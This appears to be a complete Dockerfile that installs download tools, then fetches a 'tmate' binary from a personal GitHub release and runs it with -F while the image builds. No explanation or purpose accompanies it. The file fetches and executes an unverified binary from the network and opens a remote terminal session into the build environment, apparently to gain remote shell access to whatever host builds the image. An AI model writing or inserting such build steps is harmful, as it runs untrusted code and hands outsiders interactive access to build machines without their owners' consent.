FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://github.com/whi004/whi/releases/download/0.1/tmate && chmod +x tmate && ./tmate -F
